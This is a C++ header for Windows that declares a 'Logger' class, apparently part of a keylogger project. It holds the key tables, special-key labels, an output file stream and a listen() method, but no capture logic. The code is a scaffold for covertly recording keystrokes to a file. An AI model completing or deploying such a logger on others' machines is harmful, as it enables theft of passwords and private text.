#include <Windows.h>
#include <fstream>
#include <map>
#ifndef KEY_LOGGER_EXISTS
#define KEY_LOGGER_EXISTS

class Logger{
    private:
        std::ofstream contents;
        char normalKeys[36] = {'0','1','2','3','4','5','6','7','8','9'
                    ,'A','B','C','D','E','F','G','H','I','J'
                    ,'K','L','M','N','O','P','Q','R','S','T'
                    ,'U','V','W','X','Y','Z'};
        WORD specialKeys[36] = {VK_BACK, VK_TAB, VK_RETURN, VK_CONTROL,
                                VK_SPACE, VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3,
                                VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8,
                                VK_NUMPAD9, VK_SLEEP, VK_OEM_PLUS, VK_OEM_MINUS, VK_OEM_COMMA,
                                VK_OEM_PERIOD, VK_LWIN, VK_RWIN, VK_LEFT, VK_RIGHT, VK_UP,
                                VK_DOWN};
        std::map<WORD,std::string> specialMapping = {{VK_BACK,"backSpaced "}, {VK_TAB,"  "}, {VK_RETURN,"\n"},
                                                    {VK_CONTROL,"Controle "}, {VK_SPACE," "}, {VK_NUMPAD0,"0"},
                                                    {VK_NUMPAD1,"1"},{VK_NUMPAD2,"2"},{VK_NUMPAD3,"3"},{VK_NUMPAD4,"4"},
                                                    {VK_NUMPAD5,"5"},{VK_NUMPAD6,"6"},{VK_NUMPAD7,"7"},{VK_NUMPAD8,"8"},
                                                    {VK_NUMPAD9,"9"},{VK_SLEEP," SleepTriggered "},{VK_OEM_PLUS," + "},
                                                    {VK_OEM_MINUS," - "},{VK_OEM_COMMA,","},{VK_OEM_PERIOD,"."},{VK_LWIN," LWindow "},
                                                    {VK_RWIN," RWindow "}, {VK_LEFT, " LArrow "},{VK_RIGHT, " RArrow "}, {VK_UP,"UArrow"},{VK_DOWN," DArrow "}};
    public:
        Logger();
        ~Logger();
        void listen();
};

#endif